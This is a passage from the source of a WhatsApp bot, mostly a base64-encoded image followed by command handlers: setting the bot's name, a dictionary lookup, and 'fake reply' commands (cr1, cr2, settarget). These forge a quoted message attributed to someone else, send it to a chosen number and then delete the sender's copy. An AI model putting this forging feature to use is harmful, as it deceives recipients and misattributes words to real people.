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`
					reply(`*Berhasil reset fake reply seperti semula*`)
					break
					case 'setname':
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
					if (args.length < 1) return
					jing = body.slice(9)
					benny.updateProfileName(jing)
					reply(`*Berhasil ubah name menjadi:* ${jing}`)
					break
				case 'setnumber':
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
		
					if (args.length < 1) return
					numbernye = `${args[0]}@s.whatsapp.net`
					reply(`*Berhasil ubah Number reply menjadi:* ${numbernye.replace('@s.whatsapp.net', '')}`)
					break
				case 'tes':
				benny.sendMessage(from, 'tes', extendedText, {thumbnail: setthumb, previewType: 'NONE', contextInfo: {forwardingScore: 0, isForwarded: false}})
				break
				case 'cr1':
				
						// licensed by aex-bot -> namabotnte
				var split = args.join(' ').replace(/@|\d/gi, '').split('|')
				var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
				reply(`${split[1]}`)
				break
				case 'settarget':
					if (args.length < 1) return
					targetprivate = args[0]
					benny.sendMessage(from, `Succes Mengganti target Privte Fake Reply : ${targetprivate}`, text, { quoted: adadeh })
					break
				case 'cr2':
				
					jids = `${targetprivate}@s.whatsapp.net` // nomer target
					var split = args.join(' ').replace(/@|\d/gi, '').split('|')
					var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
					const options = {
					contextInfo: {
					quotedMessage: {
					extendedTextMessage: {
					text: split[0]
										}
									}
								}
							}
					const responye = await benny.sendMessage(jids, `${split[1]}`, MessageType.text, options)
					await benny.deleteMessage (jids, {id: responye.messageID, remoteJid: jids, fromMe: true})
					break
					case 'kbbi':
					
					var kbbi = body.slice(6)
					anu = await kbbiSearch(kbbi)
						reply(mess.wait)
						console.log(anu)
						teks = `*${anu.result[0]}*`
					    reply(teks)
				break
				case 'takelink':
